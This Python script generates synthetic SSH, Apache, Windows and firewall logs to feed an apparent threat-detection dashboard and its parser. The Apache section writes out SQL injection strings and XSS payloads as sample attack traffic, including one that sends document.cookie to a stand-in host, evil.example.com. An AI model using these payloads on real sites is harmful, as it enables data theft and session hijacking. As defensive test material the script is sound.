"""
generate_logs.py
Generates 4 realistic log files (SSH, Apache, Windows, Firewall),
registers each in the DB, and parses them using the existing parser.
Run once: py -3 generate_logs.py
"""
import os, sys, random, sqlite3
from datetime import datetime, timedelta

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
os.chdir(os.path.dirname(os.path.abspath(__file__)))
import app as _app

LOGS_DIR = _app.LOGS_DIR
DB_PATH  = _app.DB_PATH

random.seed(42)

# ── Shared data pools ──────────────────────────────────────────────────────────
ATTACKER_IPS = [
    "203.0.113.45", "198.51.100.23", "185.220.101.7",
    "45.33.32.156",  "91.108.4.200",  "194.165.16.11",
    "77.247.181.163","162.247.74.201","104.244.42.65",
    "198.98.51.189",
]
INTERNAL_IPS = ["10.0.0.5", "10.0.0.12", "192.168.1.20", "172.16.0.8"]
USERS        = ["admin", "root", "ubuntu", "deploy", "git", "oracle",
                "postgres", "test", "user1", "bob", "alice", "svcaccount"]
NOW          = datetime.utcnow()

def ts(minutes_ago: int) -> datetime:
    return NOW - timedelta(minutes=minutes_ago)

def fmt_syslog(dt: datetime) -> str:
    return dt.strftime("%b %d %H:%M:%S")

def fmt_apache(dt: datetime) -> str:
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")

def fmt_win(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%d %H:%M:%S")


# ── 1. SSH log (150 lines) ─────────────────────────────────────────────────────
def make_ssh_log() -> str:
    lines = []
    pid_base = 10000
    # Simulate a brute-force campaign from two IPs then a successful login
    brute_ip  = "203.0.113.45"
    brute_ip2 = "185.220.101.7"
    for i in range(60):
        t = ts(random.randint(1, 4320))
        ip = brute_ip if i < 40 else brute_ip2
        user = random.choice(USERS)
        pid  = pid_base + i
        lines.append(f"{fmt_syslog(t)} prod-server sshd[{pid}]: Failed password for invalid user {user} from {ip} port {random.randint(1024,65535)} ssh2")

    # Accepted logins
    for i in range(15):
        t = ts(random.randint(1, 2880))
        ip   = random.choice(INTERNAL_IPS)
        user = random.choice(["deploy", "ubuntu", "alice"])
        pid  = pid_base + 100 + i
        lines.append(f"{fmt_syslog(t)} prod-server sshd[{pid}]: Accepted password for {user} from {ip} port {random.randint(1024,65535)} ssh2")
        lines.append(f"{fmt_syslog(t)} prod-server sshd[{pid}]: pam_unix(sshd:session): session opened for user {user} by (uid=0)")

    # Invalid user attempts
    for i in range(20):
        t    = ts(random.randint(1, 5000))
        ip   = random.choice(ATTACKER_IPS)
        user = random.choice(["admin", "root", "test", "oracle", "pi"])
        pid  = pid_base + 200 + i
        lines.append(f"{fmt_syslog(t)} prod-server sshd[{pid}]: Invalid user {user} from {ip} port {random.randint(1024,65535)}")

    # Privilege escalation
    for i in range(5):
        t   = ts(random.randint(10, 1440))
        pid = pid_base + 300 + i
        lines.append(f"{fmt_syslog(t)} prod-server sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash")
        lines.append(f"{fmt_syslog(t)} prod-server sudo: pam_unix(sudo:session): session opened for user root by deploy(uid=1000)")

    # Port scan detection
    for i in range(5):
        t  = ts(random.randint(100, 3000))
        ip = random.choice(ATTACKER_IPS)
        lines.append(f"{fmt_syslog(t)} prod-server kernel: Possible portscan from {ip} detected on eth0")

    random.shuffle(lines)
    return "\n".join(lines) + "\n"


# ── 2. Apache access log (150 lines) ──────────────────────────────────────────
def make_apache_log() -> str:
    lines = []
    # Normal traffic
    normal_paths = ["/", "/index.html", "/about", "/contact", "/static/logo.png",
                    "/api/status", "/favicon.ico", "/robots.txt"]
    for i in range(40):
        t    = ts(random.randint(1, 7200))
        ip   = random.choice(INTERNAL_IPS + ["8.8.8.8", "1.1.1.1"])
        path = random.choice(normal_paths)
        size = random.randint(200, 8000)
        lines.append(f'{ip} - - [{fmt_apache(t)}] "GET {path} HTTP/1.1" 200 {size} "-" "Mozilla/5.0"')

    # SQL Injection attempts
    sqli_payloads = [
        "/index.php?id=1 UNION SELECT username,password FROM users--",
        "/login.php?user=admin' OR '1'='1",
        "/search?q=1; DROP TABLE users--",
        "/product?id=1 AND 1=1",
        "/page?id=1' AND SLEEP(5)--",
    ]
    for i in range(25):
        t    = ts(random.randint(1, 5000))
        ip   = random.choice(ATTACKER_IPS)
        path = random.choice(sqli_payloads)
        lines.append(f'{ip} - - [{fmt_apache(t)}] "GET {path} HTTP/1.1" 200 512 "-" "sqlmap/1.7"')

    # XSS attempts
    xss_payloads = [
        "/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E",
        "/comment?text=<script>fetch('http://evil.example.com/?c='+document.cookie)</script>",
        "/profile?name=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E",
    ]
    for i in range(20):
        t    = ts(random.randint(1, 4000))
        ip   = random.choice(ATTACKER_IPS)
        path = random.choice(xss_payloads)
        lines.append(f'{ip} - - [{fmt_apache(t)}] "GET {path} HTTP/1.1" 200 215 "-" "Mozilla/5.0"')

    # Nikto scan
    nikto_paths = ["/admin/", "/wp-admin/", "/.env", "/config.php",
                   "/phpinfo.php", "/backup.zip", "/.git/config"]
    for i in range(20):
        t    = ts(random.randint(200, 3000))
        ip   = "45.33.32.156"
        path = random.choice(nikto_paths)
        lines.append(f'{ip} - - [{fmt_apache(t)}] "GET {path} HTTP/1.1" 404 196 "-" "Nikto/2.1.6"')

    # Metasploit / exploit attempts
    for i in range(10):
        t  = ts(random.randint(50, 2000))
        ip = random.choice(ATTACKER_IPS)
        lines.append(f'{ip} - - [{fmt_apache(t)}] "GET /cgi-bin/test.cgi HTTP/1.1" 500 0 "-" "Metasploit/6.3"')

    # Hydra brute-force on login
    for i in range(35):
        t    = ts(random.randint(1, 1440))
        ip   = "91.108.4.200"
        user = random.choice(USERS)
        lines.append(f'{ip} - - [{fmt_apache(t)}] "POST /login HTTP/1.1" 401 128 "-" "Hydra/9.4"')

    random.shuffle(lines)
    return "\n".join(lines) + "\n"


# ── 3. Windows Event log (100 lines) ──────────────────────────────────────────
def make_windows_log() -> str:
    lines = []

    # Failed logons (Event 4625)
    for i in range(40):
        t    = ts(random.randint(1, 5000))
        ip   = random.choice(ATTACKER_IPS)
        user = random.choice(USERS)
        lines.append(
            f"{fmt_win(t)} WORKSTATION01 Microsoft-Windows-Security-Auditing[4625]: "
            f"An account failed to log on. Account Name: {user} "
            f"Source Network Address: {ip} Failure Reason: Unknown user name or bad password"
        )

    # Successful logons (Event 4624)
    for i in range(15):
        t    = ts(random.randint(1, 2880))
        ip   = random.choice(INTERNAL_IPS)
        user = random.choice(["alice", "bob", "svcaccount"])
        lines.append(
            f"{fmt_win(t)} WORKSTATION01 Microsoft-Windows-Security-Auditing[4624]: "
            f"An account was successfully logged on. Account Name: {user} "
            f"Source Network Address: {ip} Logon Type: 3"
        )

    # Privilege use (Event 4672)
    for i in range(10):
        t    = ts(random.randint(10, 1440))
        user = random.choice(["Administrator", "svcaccount"])
        lines.append(
            f"{fmt_win(t)} WORKSTATION01 Microsoft-Windows-Security-Auditing[4672]: "
            f"Special privileges assigned to new logon. Account Name: {user} Privileges: SeDebugPrivilege SeTcbPrivilege"
        )

    # Malware / Defender alerts
    malware_names = ["Trojan:Win32/Emotet", "Ransom:Win32/WannaCrypt",
                     "Backdoor:Win32/Poison", "Worm:Win32/Conficker",
                     "Trojan:Win32/AgentTesla"]
    paths = [r"C:\Users\bob\Downloads\invoice.exe",
             r"C:\Temp\payload.exe", r"C:\Windows\Temp\svchost32.exe",
             r"C:\Users\alice\AppData\Local\Temp\trojan.bin"]
    for i in range(20):
        t    = ts(random.randint(30, 4000))
        name = random.choice(malware_names)
        path = random.choice(paths)
        lines.append(
            f"{fmt_win(t)} WORKSTATION01 Microsoft-Windows-Defender[1116]: "
            f"Malware detected. Threat Name: {name} Path: {path} Action: Quarantine"
        )

    # Port scan / suspicious network (Event 5156 / custom IDS)
    for i in range(15):
        t  = ts(random.randint(100, 3500))
        ip = random.choice(ATTACKER_IPS)
        lines.append(
            f"{fmt_win(t)} WORKSTATION01 Microsoft-Windows-Security-Auditing[5156]: "
            f"Possible portscan detected. Source IP: {ip} Destination Port Range: 1-1024"
        )

    random.shuffle(lines)
    return "\n".join(lines) + "\n"


# ── 4. Firewall log (100 lines) ───────────────────────────────────────────────
def make_firewall_log() -> str:
    lines = []
    actions  = ["DENY", "DROP", "REJECT"]
    protocols = ["TCP", "UDP", "ICMP"]
    services  = {22: "SSH", 80: "HTTP", 443: "HTTPS", 3389: "RDP",
                 3306: "MySQL", 5432: "Postgres", 6379: "Redis", 27017: "MongoDB"}

    # Blocked inbound attacks
    for i in range(60):
        t      = ts(random.randint(1, 7200))
        src_ip = random.choice(ATTACKER_IPS)
        dst_ip = random.choice(INTERNAL_IPS)
        proto  = random.choice(protocols)
        dport  = random.choice(list(services.keys()))
        sport  = random.randint(1024, 65535)
        action = random.choice(actions)
        svc    = services[dport]
        lines.append(
            f"{fmt_win(t)} fw01 kernel: {action} IN=eth0 OUT= "
            f"SRC={src_ip} DST={dst_ip} PROTO={proto} SPT={sport} DPT={dport} "
            f"# {svc} access attempt"
        )

    # Portscan signatures
    for i in range(20):
        t      = ts(random.randint(50, 5000))
        src_ip = random.choice(ATTACKER_IPS)
        dst_ip = random.choice(INTERNAL_IPS)
        lines.append(
            f"{fmt_win(t)} fw01 snort[1234]: [1:1228:7] SCAN nmap SYN scan "
            f"SRC={src_ip} DST={dst_ip} PROTO=TCP flags=S"
        )

    # Suspicious outbound (possible C2)
    c2_ips = ["104.244.42.65", "198.98.51.189", "77.247.181.163"]
    for i in range(20):
        t      = ts(random.randint(10, 3000))
        src_ip = random.choice(INTERNAL_IPS)
        dst_ip = random.choice(c2_ips)
        lines.append(
            f"{fmt_win(t)} fw01 kernel: DENY IN= OUT=eth0 "
            f"SRC={src_ip} DST={dst_ip} PROTO=TCP SPT={random.randint(1024,65535)} DPT=443 "
            f"# suspicious connection from {src_ip}"
        )

    random.shuffle(lines)
    return "\n".join(lines) + "\n"


# ── Write files + import into DB ──────────────────────────────────────────────
FILES = {
    "realistic_ssh.log":      make_ssh_log,
    "realistic_apache.log":   make_apache_log,
    "realistic_windows.log":  make_windows_log,
    "realistic_firewall.log": make_firewall_log,
}

os.makedirs(LOGS_DIR, exist_ok=True)

conn = sqlite3.connect(DB_PATH)
conn.row_factory = sqlite3.Row
cur  = conn.cursor()
cur.execute("SELECT filepath FROM logs")
existing = {r[0] for r in cur.fetchall()}

to_parse = []
for fname, generator in FILES.items():
    path = os.path.join(LOGS_DIR, fname)
    # Always regenerate the file with fresh data
    content = generator()
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"  wrote {fname} ({len(content.splitlines())} lines)")

    if path in existing:
        # File already registered — wipe old threats so we re-parse fresh data
        cur.execute("SELECT id FROM logs WHERE filepath=?", (path,))
        row = cur.fetchone()
        if row:
            cur.execute("DELETE FROM threats WHERE log_id=?", (row[0],))
            conn.commit()
            to_parse.append((row[0], path))
    else:
        cur.execute(
            "INSERT OR IGNORE INTO logs (filename, filepath, uploaded_at) VALUES (?,?,?)",
            (fname, path, datetime.utcnow().isoformat()),
        )
        conn.commit()
        if cur.lastrowid:
            to_parse.append((cur.lastrowid, path))
        else:
            cur.execute("SELECT id FROM logs WHERE filepath=?", (path,))
            to_parse.append((cur.fetchone()[0], path))

conn.close()  # close before parse to avoid lock

for log_id, path in to_parse:
    _app.parse_log_and_store(log_id, path)
    print(f"  parsed log_id={log_id} -> {os.path.basename(path)}")

# ── Final counts ──────────────────────────────────────────────────────────────
conn = sqlite3.connect(DB_PATH)
conn.row_factory = sqlite3.Row
cur  = conn.cursor()
cur.execute("SELECT COUNT(*) FROM logs");    total_logs    = cur.fetchone()[0]
cur.execute("SELECT COUNT(*) FROM threats"); total_threats = cur.fetchone()[0]
cur.execute("SELECT severity, COUNT(*) FROM threats GROUP BY severity")
sev = {r[0]: r[1] for r in cur.fetchall()}
cur.execute("SELECT type, COUNT(*) FROM threats GROUP BY type ORDER BY 2 DESC LIMIT 8")
types = cur.fetchall()
conn.close()

sep = "-" * 50
print(f"\n{sep}")
print(f"  Total log files : {total_logs}")
print(f"  Total threats   : {total_threats}")
print(f"  Critical        : {sev.get('Critical',0)}")
print(f"  High            : {sev.get('High',0)}")
print(f"  Medium          : {sev.get('Medium',0)}")
print(f"  Low             : {sev.get('Low',0)}")
print(f"\n  Top threat types:")
for t in types:
    print(f"    {t[0]:<25} {t[1]}")
print(sep)
print("  Done. Restart the app and refresh the dashboard.")
